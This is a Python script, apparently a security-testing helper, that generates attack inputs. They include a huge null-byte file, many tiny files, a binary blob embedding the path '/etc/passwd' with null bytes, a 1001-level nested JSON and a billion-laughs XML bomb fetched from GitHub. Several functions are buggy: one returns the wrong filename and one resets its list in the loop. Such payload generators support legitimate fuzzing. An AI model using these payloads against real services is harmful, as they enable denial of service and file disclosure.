#!/usr/bin/env python
import os
import argparse
import urlparse

import requests

base_url = "https://raw.github.com/rahulunair/attack_payloads/data"
attack_strings = {
    "null": b"\x00",
    "crafted": b"\x01\x23\x42" + "/etc/passwd" + b"\x00" * 2,
    "tiny": b"\x00" * 2,
    "bill_xml": "",
    "depth_json": ""
}


def giant_null_file(as_file=False, filename=None, size=0):
    """Create a giant binary null file"""
    filename = filename or "giant.bin"
    size = size or 24
    if as_file:
        with open(filename, "wb") as gf:
            gf.write(bytearray(attack_strings["null"]) * (2**size))
        return os.path.abspath("null.bin")
    return attack_strings["null"] * (2**size)


def tiny_null_files(number=0):
    """Create number of tiny files"""
    number = number or 10
    for num in range(number):
        file_list = []
        with open(str(num) + "_file.bin", "wb") as fh:
            fh.write(attack_strings["tiny"])
        file_list.append(os.path.abspath(fh.name))
    return file_list


def crafted_binary(as_file=False):
    if as_file:
        with open("crafted.bin", "wb") as fh:
            fh.write(attack_strings["crafted"])
        return os.path.abspath("crafted.bin")
    return attack_strings["crafted"]


def billion_laughs():
    """A billion laughs xml"""
    attack_strings["bill_xml"] = requests.get(urlparse.urljoin(
        base_url, "bill_laughs.xml"))
    return attack_strings["bill_xml"]


def crazy_json(as_file=False):
    """A deep nested json file generator"""
    attack_strings["depth_json"] = '{"id":' * 1001 + '42' + '}' * 1001
    if as_file:
        with open("depth_limit.json", "wb") as fh:
            fh.write(attack_strings["depth_json"])
            return os.path.abspath(fh.name)
    return attack_strings["depth_json"]


def main():
    """Entry point, calls different functions based on option selected."""
    parser = argparse.ArgumentParser()
    parser.add_argument("--as_file",
                        help="Content will be saved as file if present",
                        action="store_true")
    parser.add_argument("--filename",
                        help="Name of the file")
    parser.add_argument("--number",
                        type=int,
                        help="Number of files")
    parser.add_argument("--size",
                        type=int,
                        help="Size of the file")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--crazy_json",
                       help="A deep nested json",
                       action="store_true")
    group.add_argument("--bill_laughs",
                       help="Billion laughs",
                       action="store_true")
    group.add_argument("--crafted",
                       help="A binary file with /etc/passwd",
                       action="store_true")
    group.add_argument("--tiny_files",
                       help="A set of tiny files",
                       action="store_true")
    group.add_argument("--giant_file",
                       help="A giant null file",
                       action="store_true")
    args = parser.parse_args()

    as_file = args.as_file
    if args.giant_file:
        giant_null_file(as_file, filename=args.filename, size=args.size)
    elif args.tiny_files:
        tiny_null_files(number=args.number)
    elif args.crafted:
        crafted_binary(as_file)
    elif args.bill_laughs:
        billion_laughs()
    elif args.crazy_json:
        crazy_json(as_file)

if __name__ == "__main__":
    main()
